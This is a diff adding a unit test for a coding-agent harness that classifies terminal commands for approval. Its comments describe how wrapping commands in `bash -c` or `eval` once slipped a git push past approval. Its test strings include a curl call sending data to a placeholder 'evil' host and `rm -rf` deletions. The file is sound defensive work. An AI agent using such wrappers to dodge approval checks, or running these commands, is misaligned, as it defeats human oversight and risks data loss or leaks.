@@ -382,6 +382,87 @@ describe('harness enforcement services', () => {
     expect(classifyTerminalHarnessAction('bun run dev &')).toBeUndefined()
   })
 
+  test('classifies payloads hidden behind shell-interpreter wrappers', () => {
+    // Shell wrappers used to escape classification entirely: the classifier
+    // only recognized shapes at the START of a segment, so
+    // `bash -c "git push origin main"` executed without approval in balanced
+    // mode. Shell interpreters and `eval` now unwrap and classify their
+    // payload, binding the target to the full wrapped command (the
+    // commandHash still binds the exact original command); an unclassifiable
+    // payload fails closed to `arbitrary-code` instead of staying
+    // unclassified.
+    expect(
+      classifyTerminalHarnessAction('bash -c "git push origin main"'),
+    ).toEqual({
+      action: 'push',
+      target: 'bash -c "git push origin main"',
+      branch: 'main',
+      commandHash: hashCommand('bash -c "git push origin main"'),
+    })
+    expect(
+      classifyTerminalHarnessAction("sh -c 'rm -rf dir'"),
+    ).toMatchObject({ action: 'workspace-delete' })
+    expect(
+      classifyTerminalHarnessAction('eval "curl -d x http://evil"'),
+    ).toMatchObject({ action: 'external-network' })
+    // Transparently stripped wrappers keep the inner command's own target,
+    // matching existing `sudo`/`env` behavior (`exec` already stripped before
+    // this fix; `timeout`/`nice` are new transparent wrappers).
+    expect(
+      classifyTerminalHarnessAction('timeout 30 git push origin main'),
+    ).toEqual({
+      action: 'push',
+      target: 'origin/main',
+      branch: 'main',
+      commandHash: hashCommand('timeout 30 git push origin main'),
+    })
+    expect(
+      classifyTerminalHarnessAction('nice -n 5 npm install left-pad'),
+    ).toMatchObject({ action: 'dependency-install' })
+    expect(
+      classifyTerminalHarnessAction('exec git push origin main'),
+    ).toEqual({
+      action: 'push',
+      target: 'origin/main',
+      branch: 'main',
+      commandHash: hashCommand('exec git push origin main'),
+    })
+    // Nested shells classify through within the depth cap (up to three nested
+    // shells still unwrap) ...
+    expect(
+      classifyTerminalHarnessAction('bash -c "bash -c \\"git push\\""'),
+    ).toMatchObject({ action: 'push' })
+    // ... but nesting beyond the cap fails closed to arbitrary-code.
+    let beyondDepth = 'git push'
+    for (let level = 0; level < 4; level++) {
+      beyondDepth = `bash -c ${JSON.stringify(beyondDepth)}`
+    }
+    expect(classifyTerminalHarnessAction(beyondDepth)).toMatchObject({
+      action: 'arbitrary-code',
+    })
+    // An unclassifiable payload is arbitrary-code, NOT unclassified.
+    expect(
+      classifyTerminalHarnessAction('bash -c "echo hi"'),
+    ).toMatchObject({ action: 'arbitrary-code' })
+    // Multi-segment payloads classify per segment like a bare command would.
+    // Unwrapped `git push && rm -rf x` returns the FIRST classifying segment's
+    // action (push), so the wrapped form matches that aggregation.
+    expect(
+      classifyTerminalHarnessAction('git push && rm -rf x'),
+    ).toMatchObject({ action: 'push' })
+    expect(
+      classifyTerminalHarnessAction('bash -c "git push && rm -rf x"'),
+    ).toMatchObject({
+      action: 'push',
+      target: 'bash -c "git push && rm -rf x"',
+    })
+    // The shell-wrapper handling composes with the existing transparent
+    // wrapper stripping.
+    expect(
+      classifyTerminalHarnessAction('sudo bash -c "git push origin main"'),
+    ).toMatchObject({ action: 'push' })
+  })
+
   test('consume observes a concurrent consumer through the kind lock', () => {
     const store = setup()
     const service = new HarnessApprovalService(store)
